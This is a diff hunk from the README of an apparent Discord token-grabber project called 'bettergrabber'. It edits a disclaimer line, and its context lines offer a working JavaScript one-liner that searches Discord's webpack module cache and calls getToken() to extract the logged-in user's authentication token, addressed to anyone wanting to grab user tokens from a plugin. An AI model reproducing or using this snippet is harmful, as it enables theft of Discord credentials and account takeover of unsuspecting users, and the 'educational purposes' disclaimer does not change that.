@@ -4,7 +4,7 @@ To anyone looking for a way to grab user tokens from a plugin, this snippet from
 ```js
 (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()
 ```
-As with the warning below, this is for educational purpose.
+As with the warning below, this is for educational purposes. I take no responsibility for the malicious use of this code.
 
 # bettergrabber
 
